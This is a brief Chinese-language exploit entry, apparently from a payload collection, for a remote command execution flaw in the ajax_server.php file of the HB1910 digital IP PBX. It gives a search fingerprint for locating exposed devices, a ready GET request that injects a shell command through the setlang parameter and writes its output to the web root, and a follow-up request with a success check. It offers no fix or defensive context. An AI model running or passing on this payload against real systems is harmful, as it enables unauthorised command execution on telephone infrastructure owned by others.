# HB1910数字IP程控交换机ajax_server.php存在远程命令执行漏洞

HB1910 ｜ 命令执行 ｜ —
- **指纹**：`body="themes/tenant/css/login.css"`
- **请求**：`GET /ajax_server.php?action=setE1Language&setlang=;id>/var/www/html/1q.txt HTTP/1.1`

**Payload**
```
访问写入的地址
GET /1q.txt HTTP/1.1
```
- **响应特征**：200